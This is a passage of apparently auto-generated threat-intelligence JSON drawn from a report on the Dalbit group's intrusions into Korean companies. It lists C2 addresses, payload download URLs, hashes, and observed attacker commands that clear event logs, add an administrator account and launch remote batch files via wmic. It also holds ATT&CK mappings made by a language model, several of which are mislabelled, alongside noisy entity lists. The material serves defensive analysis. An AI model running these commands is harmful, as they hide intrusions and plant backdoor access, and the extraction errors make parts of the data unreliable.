Escalation9fe61c9538f2df492dff1aab0f90579fab9091f25a5ad44bef898588764f199087e5c9f3127f29465ae04b9160756c62ab9091f25a5ad44bef898588764f1990 4bafbdca775375283a90f47952e182d90311ee1452a19b97e626d24751375652acacf51ceef8943f0ee40fc181b6f1fa3cbea05bf7a1affb821e379b1966d89c10f4a1df9c3f1388f9c74eb4cdf24e7cb5bdf2de230722e1fe63d88d8f628ebcedb685194f2fcd6a92f6e909dee7a237e9bd5ed33a573bd5d9c4e071567808e5fbae6c3769ed4ae4eccaff76af7e7dfe 937435bbcbc3670430bb762c56c7b329fd0f73dd80d15626602c08b90529d9fd29274ca90e6dcf5ae4762739fcbadf01784becfb944dec42cccf75c8cf2b97e37307c6900952d4ef385231179c0a05e4bcfca13c801608a82a0924f787a19e1d 75fe1b6536e94aaee132c8d022e14f85 d6cb8b66f7a9f3b26b4a98acb2f9d0c5 323a36c23e61c6b37f28abfd5b7e5dfe7b40aa57e1c61ecd6db2a1c18e08b0af3665d512be2e9d31fc931912d5c6900e   Network Scan1aca4310315d79e70168f15930cc3308 5e0845a9f08c1cfc7966824758b6953a9b0e4652a0317e6e4da66f29a74b5ad7d8d36f17b50c8a37c2201fbb0672200ab998a39b31ad9b409d68dcb74ac6d97dd5054ed83e63f911be46b3ff8af82267e7b7bf4c2ed49575bedabdce2385c8d5 f01a9a2d1e31332ed36c1a4d2839f412 d4d8c9be9a4a6499d254e845c6835f5f   FRP4eb5eb52061cc8cf06e28e7eb20cd0550cc22fd05a3e771b09b584db0a1613638de8dfcb99621b21bf66a3ef2fcd8138df8f2dc27cbbd10d944210b19f97dafd2866f3c8dfd5698e7c58d166a5857e1e 1 6 / 1 7 cbee2fd458ff686a4cd2dde42306bba13dc8b64b498220612a43d36049f055ab31c4a3f16baa5e0437fdd4603987b812b33a27bfbe7677df4a465dfa9795ff4a7d9c233b8c9e3f0ea290d2b84593c842c4f18576fd1177ba1ef54e884cb7a79d5d33609af27ea092f80aff1af6ddf98d622f060fce624bdca9a427c3edec16631f2432ec77b750aa3e3f72c866584dc3d331602d190c0963ec83e46f5a5cd54a21d268341884c4fc62b5af7a3b433d90   FRP_INI6a20945ae9f7c9e1a28015e40758bb4fa29f39713ce6a92e642d14374e7203f07ce988f1b593e96206a1ef57eb1bec8afc9abba1f212db8eeac7734056b81a6e9f55b31c66a01953c17eea6ace66f63633129e959221bf9d5211710747fddabe48b99c2f0441f5a4794afb4f89610e4828e026b9550e4eb37435013425abfa382ceabffe2d40714e5535212d46d78119c72750485db39d0c04469cd6b100a59568403cc3a6fcbeb9e5e9f7263d04c02f52ff6e3e942ac8ee012dcde89e7a1116d82481e9bc50d9d9aeb9d56072bf3cfe22381941763862631070e043d4dd0dc26b5bccf615bf634b0e55a86a9c24c902942d949a28b2921fb980e2d659e6ef75059d98dcb83be037cd9829d31c096dabcca50cdd843aa824e5eef5f05e74f4a5f6f0d44aa5e3d83bb1ac777c9cea70600ca345bc074fa2ef7a2797b875b6cd4df6da8dc4e1226aa2d0dabc32acd069150bbfaea19c8d1444ae282ff5911a527b   LCXa69d3580921ec8adce64c9b38ac3653ac4e39c1fc0e1b165319fa533a9795c44fb6bf74c6c1f2482e914816d6e97ce09678dbe60e15d913fb363c8722bde313d   Proxies etc.e0f4afe374d75608d604fbf108eac64f f5271a6d909091527ed9f30eafa0ded6 ae8acf66bfe3a44148964048b826d005   Lateral Movement6983f7001de10f4d19fc2d794c3eb534fcb7f7dab6d401a17bd436fc12a84623   Information Collection and Credential Theftbb8bdb3e8c92e97e2f63626bc3b254c480f421c5fd5b28fc05b485de4f7896a1a03b57cc0103316e974bbb0f159f78f646f366e3ee36c05ab5a7a319319f7c727bd775395b821e158a6961c573e6fd43 b434df66d0dd15c2f5e5b2975f2cfbe2 1 7 / 1 7 c17cfe533f8ce24f0e41bd7e14a35e5e   Backdoor011cedd9932207ee5539895e2a1ed60abc744a4bf1c158dba37276bf7db50d8523c0500a69b71d5942585bb87559fe8353271b2ab6c327a68e78a7c0bf9f4044c87ac56d434195c527d3358e12e2b2e0 C2 and URL (Abused Korean company servers are not listed)   Download C2 91.217.139[.]117   Upload C2 205.185.122[.]95 91.217.139[.]117   FRP   LCX C2 hxxp://sk1.m00nlight[.]top:80 (45.136.186.19) //MOACK_Co_LTD company server hxxps://fk.m00nlight[.]top:443 (45.136.186.175:443) //MOACK_Co_LTD company server hxxps://aa.zxcss[.]com:443 (45.93.31.122) //MOACK_Co_LTD company server 45.93.31[.]75:7777 //MOACK_Co_LTD company server 45.93.28[.]103:8080 //MOACK_Co_LTD company server 103.118.42[.]208 101.43.121[.]50   Backdoor C2 45.93.31[.]75 //MOACK_Co_LTD company server Subscribe to AhnLab s next-generation threat intelligence platform  AhnLab TIP  to check related IOC and detailed analysisinformation. Categories:Malware Information Tagged as:AntSword APT AspxSpy BadPotato BitLocker Bitsadmin Blueshell certutil Chopper CobaltStrike conf.aspx CVE-2017-10271 CVE-2018-8639 CVE-2019-1458 Dalbit duhgghmpert.dmp Dumpert EFSPotato ff0.123456 FRP FSCAN Godzilla Gotohttp HTRAN JuicyPotato Ladon LCX m00nlight main Mimikatz NPS NTLTEST ProcDump RDP ReGeorg RottenPotato Rsync SweetPotato WebLogic xp_cmdshell",
            "commands": [
              "cmd.exe /c wevtutil cl security  Removal of application logs > cmd.exe wevtutil.exe el > cmd.exe wevtutil.exe cl \u201capplication\u201d",
              "schtasks  /tn debug /run",
              "WMIC command or a screenshot of the affected PC is sent to the threat actor\u2019s server at regular intervalsaccording to the companies.",
              "WMIC command to check installed programs.",
              "net user main ff0.123456 /add & net localgroup administrators main /add\u201d (Add account)",
              "wmic product get name,version",
              "wmic  /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$  process call create \u201ccmd.exe /c c:\\temp\\s.bat\u201d",
              "cmd.exe /c c:\\temp\\****\\temp\\frpc.ini \u2026"
            ],
            "file_paths": [
              "/Win.ProxyVenom.C5280699(2022.10.15.01)",
              "/Win.LCX.R432995(2023.01.06.01)",
              "/Win64.Cve-2019-1458.R345589(2020.07.22.06)",
              "c:\\temp\\s.bat\u201d",
              "/Win64.Generic.C3628819",
              "/Win.Frp.C4959080",
              "/aa.zxcss[.]com:443",
              "/Win.BadPotato.R508814",
              "/www.ive***.co[.]kr/uploadfile/ufaceimage/1/update.zip",
              "/Win32.Mimikatz.R262842(2019.04.06.00)",
              "/Script.Generic",
              "/Win.Scanner.C5220929(2022.08.09.02)",
              "/Win.BlueShell.C5272202(2022.10.05.00)",
              "/Win.Frpc.5222544",
              "/JS.Agent(2022.03.16.02)",
              "/node:127.0.0.1",
              "/ASP.ASpy.S1361",
              "/Win.JuicyPotato.C425839(2022.08.04.01)",
              "/Win.Fscan.C5230904(2022.10.08.00)",
              "D:\\Web\\(Groupware)\\bbs\\4.asmxD",
              "/Win.Swrort.R450012(2021.11.14.01)",
              "/Win32.RL_Mimikatz.R290617(2019.09.09.01)",
              "/Script.Frpc",
              "/Win.Lsassdump.R524859(2022.10.05.00)",
              "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary",
              "/Win.Generic.C4963786",
              "/Win.LCX.C5192157",
              "/Win.Escalation.R524707(2022.10.04.02)",
              "/ASP.Small.S1378",
              "/JSP.Generic.S1956",
              "/fk.m00nlight[.]top:443",
              "D:\\",
              "/Win.Rsocx.C5280341(2022.10.15.00)",
              "/91.217.139[.]117:8080/calc32.exe\u201d\u201cc:\\windows\\debug\\winh32.exe\u201d",
              "C:\\(Tomcat)\\webapps\\docs\\update.jspC",
              "c:\\programdata\\update.exe",
              "/JSP.Godzilla.S1719(2021.12.03.00)",
              "/Win.Generic.C5173495",
              "/Win.Fscan.R5229026(2022.10.07.03)",
              "c:\\temp\\EvtLogon.dat",
              "D:\\WEB\\",
              "D:\\inetpub\\(Groupware)\\image\\2.asmxD",
              "C:\\(Tomcat)\\webapps\\dd\\sb.jspC",
              "c:\\temp\\",
              "/Win.BlueShell.C5280704(2022.10.15.01)",
              "/Win.Extractor.C5266516(2022.10.01.00)",
              "/sk1.m00nlight[.]top:80",
              "/Win.Generic.R457163(2021.12.09.01)",
              "/JSP.Chopper.SC183868(2022.10.15.01)",
              "/91.217.139[.]117:8443/log.ini",
              "/103.118.42[.]208:8080/frpc.exe",
              "/Win.Exploit.C4997833",
              "/Win.Agent.C4448815",
              "D:\\Web\\(Groupware)\\cop\\1.ashxD",
              "D:\\Oracle\\",
              "/Win.Frpc.C5218510",
              "/Win.Frpc.C5162558",
              "/91.217.139[.]117:8080/calc32.exe",
              "C:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspxC",
              "/Win.Agent.C5224193",
              "/Win.Frpc.C5218508",
              "/web_log.zip",
              "/JSP.Generic.S1363",
              "/175.24.32[.]228:8888/readme",
              "/Win.Frpc.C5218513",
              "/121.167.***[.]***/temp/8.txt",
              "/Win32.TCPScan.R33304(2012.08.17.00)",
              "c:\\windows\\debug\\winh32.exe\u201d",
              "f:\\",
              "C:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmxC",
              "/Win.JuicyPotato.R509932",
              "/ASP.Generic.S1855",
              "c:\\programdata\\8.ini",
              "/Win.RemCom.R237878(2023.01.07.00)",
              "/Win.JuicyPotato.C2716248",
              "C:\\Windows\\System32\\BitLockerWizardElev.exe\u201d",
              "/Win.CobaltStrike.R360995(2022.09.20.00)",
              "/Win64.Generic.C3164061",
              "F:\\",
              "/Win.Frp.C5224195",
              "c:\\temp\\EvtLogon.dat.",
              "c:\\windows\\system32\\bitlockerwizardelev.exe\u201d",
              "e:\\",
              "/91.217.139[.]117:8080/calc32.exe\u201d",
              "E:\\WEB\\",
              "/Win.Frpc.C5222534",
              "/91.217.139[.]117:8080/1.bat",
              "/Win.Fscan.C5334550(2023.01.27.00)",
              "/91.217.139[.]117:8001/log.ini\u201d\u201cc:\\windows\\debug\\log.ini\u201d",
              "/Win.SweetPotato.C4093454",
              "D:\\UploadData\\",
              "/",
              "/Win.Agent.C5224192",
              "/Script.Backdoor",
              "/Win.SweetPotato.R506105"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "APT",
              "Backdoor",
              "Downloader",
              "Malware",
              "MetaSploit",
              "Mimikatz",
              "ProcDump",
              "Trojan",
              "conti",
              "loader",
              "ransomware",
              "rat"
            ],
            "tools": [
              "At",
              "Bitsadmin",
              "CMD",
              "Certutil",
              "MetaSploit",
              "Mimikatz",
              "PsExec",
              "ReG",
              "WMI",
              "net",
              "netsh",
              "ping",
              "sc",
              "schtasks",
              "wmic"
            ],
            "threat_actors": [],
            "ips": [
              "127.0.0.1",
              "45.136.186.175",
              "45.136.186.19",
              "45.93.31.122"
            ],
            "domains": [
              "1.ashxC",
              "1.ashxD",
              "1.asmxC",
              "1.aspx",
              "1.bat",
              "11.aspxC",
              "123.jspD",
              "2.asmxD",
              "2.aspxC",
              "2.aspxD",
              "3.aspxD",
              "4.ashxD",
              "4.asmxD",
              "8.ini",
              "8.txt",
              "8080.ini",
              "ASP.ASpy",
              "ASP.Generic",
              "ASP.NET",
              "ASP.NETFiles",
              "ASP.Small",
              "Agent.exe",
              "BadPotatoNet4.vmp.exe",
              "BitLockerWizardElev.exe",
              "EvtLogon.dat",
              "JS.Agent",
              "JSP.Chopper",
              "JSP.Generic",
              "JSP.Godzilla",
              "Lsass.exe",
              "Microsoft.NET",
              "Script.Backdoor",
              "Script.Frpc",
              "Script.Generic",
              "SweetPotato.exe",
              "SweetPotato.vmp.exe",
              "Win.Agent",
              "Win.BadPotato",
              "Win.BlueShell",
              "Win.CobaltStrike",
              "Win.Escalation",
              "Win.Exploit",
              "Win.Extractor",
              "Win.Frp",
              "Win.Frpc",
              "Win.Fscan",
              "Win.Generic",
              "Win.JuicyPotato",
              "Win.LCX",
              "Win.Lsassdump",
              "Win.ProxyVenom",
              "Win.RemCom",
              "Win.Rsocx",
              "Win.Scanner",
              "Win.SweetPotato",
              "Win.Swrort",
              "Win32.Mimikatz",
              "Win32.TCPScan",
              "Win64.Cve",
              "Win64.Generic",
              "aa.aspxD",
              "aa.zxcss",
              "aaa.jsp",
              "andonionmail.com",
              "asec.ahnlab.com",
              "badpotatonet4.exe",
              "bitlockerwizardelev.exe",
              "calc32.exe",
              "cmd.exe",
              "conf.aspx",
              "conf.aspxC",
              "conf.aspxD",
              "debug.exe",
              "debug.ini",
              "debug.log",
              "debug.txt",
              "duhgghmpert.dmp",
              "dumpert.dmp",
              "eee.jspD",
              "error.jspD",
              "etc.Chemical",
              "file.aspx",
              "frpc.exe",
              "frpc.ini",
              "frpc.vmp.exe",
              "group.The",
              "index.jspC",
              "info.exe",
              "info.zip",
              "information.Additionally",
              "java.exe",
              "jc.vmp.exe",
              "juicypotato.vmp.exe",
              "juicypotato.vmp1.exe",
              "lcx.exe",
              "lcx3.exe",
              "log.ini",
              "lsa.txt",
              "lsass.exe",
              "m00nlight.top",
              "main.exe",
              "modifyregistryhelp.jspD",
              "s.bat",
              "sb.jspC",
              "shell.jsp",
              "sp.exe",
              "sqlserver.exe",
              "startmail.com",
              "svchost.exe",
              "tarko.dmp",
              "test.exe",
              "test.jsp",
              "themselves.This",
              "tunnel.aspx",
              "update.exe",
              "update.jspC",
              "update.zip",
              "w3wp.exe",
              "wevtutil.exe",
              "winh32.exe",
              "www.ive",
              "zabbix.exe"
            ],
            "hashes": {
              "md5": [
                "75fe1b6536e94aaee132c8d022e14f85",
                "ae8acf66bfe3a44148964048b826d005",
                "b434df66d0dd15c2f5e5b2975f2cfbe2",
                "c17cfe533f8ce24f0e41bd7e14a35e5e",
                "d4d8c9be9a4a6499d254e845c6835f5f"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing",
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "Command and Scripting Interpreter",
              "Windows Management Instrumentation"
            ],
            "persistence": [
              "Registry Run Keys",
              "Scheduled Task/Job",
              "Create or Modify System Process"
            ],
            "credential_access": [
              "OS Credential Dumping"
            ],
            "discovery": [
              "Network Service Discovery",
              "Account Discovery"
            ],
            "lateral_movement": [
              "Remote Desktop Protocol",
              "Remote Services"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "**Observed Commands:**\n- cmd.exe /c wevtutil cl security  Removal of application logs > cmd.exe wevtutil.exe el > cmd.exe wevtutil.exe cl \u201capplication\u201d\n- schtasks  /tn debug /run\n- WMIC command or a screenshot of the affected PC is sent to the threat actor\u2019s server at regular intervalsaccording to the companies.\n- WMIC command to check installed programs.\n- net user main ff0.123456 /add & net localgroup administrators main /add\u201d (Add account)\n\n**File System Activity:**\n- /Win.ProxyVenom.C5280699(2022.10.15.01)\n- /Win.LCX.R432995(2023.01.06.01)\n- /Win64.Cve-2019-1458.R345589(2020.07.22.06)\n- c:\\temp\\s.bat\u201d\n- /Win64.Generic.C3628819\n\n**Network Indicators:**\n- debug.ini\n- tarko.dmp\n- Win.Rsocx\n- Win.RemCom\n- eee.jspD\n- tunnel.aspx\n- bitlockerwizardelev.exe\n- 1.ashxC\n- asec.ahnlab.com\n- 127.0.0.1\n\n**Key Security Terms:** reconnaissance, evasion, mimikatz, service, exploitation, extract, cmd, process, malware, persistence"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 33.763,
          "llm_processing_time_ms": 5412.552
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "extracted_ttps": [
          {
            "ttp_id": "f8cebeb7-e87a-4b3e-8fda-a1b7a3423b35",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The group used proxy tools like FRP and LCX for communication, specifically using the Socks5 protocol",
            "confidence_score": 0.764,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP",
              "LCX",
              "Socks5",
              "m00nlight.top"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "LCX",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "FRP",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d0931c24-4dad-41e1-85d9-713551684d2a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The threat actor used a hosting server (m00nlight.top) as a proxy and download server for their command and control (C2) communications.",
            "confidence_score": 0.755,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "m00nlight.top"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8dd97a1e-5aa9-450b-866b-c00721a1a9d8",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Fast Reverse Proxy",
            "attack_id": "T1090.003",
            "tactic": "Command and Control",
            "description": "The threat actor used Fast Reverse Proxy (FRP) to attack Korean companies, as mentioned in a previous report.",
            "confidence_score": 0.735,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.399,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fdd33c33-054c-4cda-8d43-29c8859aa58d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The threat actor used open-source tools and command-line interfaces, such as CMD, to execute commands on compromised systems.",
            "confidence_score": 0.702,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "Certutil",
              "Bitsadmin",
              "At"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5a20b8d7-5d99-4893-a1cd-881ef643aa07",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The Dalbit group used various command line tools such as At, Bitsadmin, CMD, Certutil, and MetaSploit",
            "confidence_score": 0.701,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "At",
              "Bitsadmin",
              "CMD",
              "Certutil",
              "MetaSploit"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d03e329c-f807-4e8d-9c94-89ce58baf22c",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Backdoor",
            "attack_id": "T1219",
            "tactic": "Persistence",
            "description": "Detected Malware: APT, Backdoor",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Backdoor"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "Backdoor",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5d9d8dcc-4dc6-4a1f-95a1-6e95d2ef1996",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The threat actor may have exploited a vulnerability in a Korean groupware solution to infect companies, although this is not confirmed.",
            "confidence_score": 0.692,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Korean groupware solution"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "Malware",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3d770afd-b9b6-4c2a-9535-75668d3c7ebd",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Server Software Vulnerability",
            "attack_id": "T1200",
            "tactic": "Exploitation",
            "description": "The threat actor may have exploited a vulnerability in a server to gain access to confidential information and deploy ransomware.",
            "confidence_score": 0.691,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Server vulnerability"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "Malware",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1d26b3c0-049a-4ce9-83f3-2c4e8b4fe75a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Access Tools",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "The Dalbit group used remote control tools to infiltrate servers and PC devices",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP configuration files (.ini)"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "FRP",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "893bf07c-1438-4038-bfb2-529ac38beae6",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Downloader",
            "attack_id": "T1564",
            "tactic": "Initial Access",
            "description": "Detected Malware: Downloader",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.054,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Downloader"
            ],
            "tools": [
              "At",
              "Downloader",
              "bitsadmin",
              "mimikatz",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "10557c05-be9c-438d-8680-8b765ff2c2f7",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c0245026-adba-491b-ad92-f6a580081d8f",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected use of CMD",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD",
              "cmd.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1829590e-f3d1-49b3-ad1d-8f435f2f2b89",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "System Utilities",
            "attack_id": "T1127",
            "tactic": "Execution",
            "description": "Detected use of Bitsadmin",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Bitsadmin",
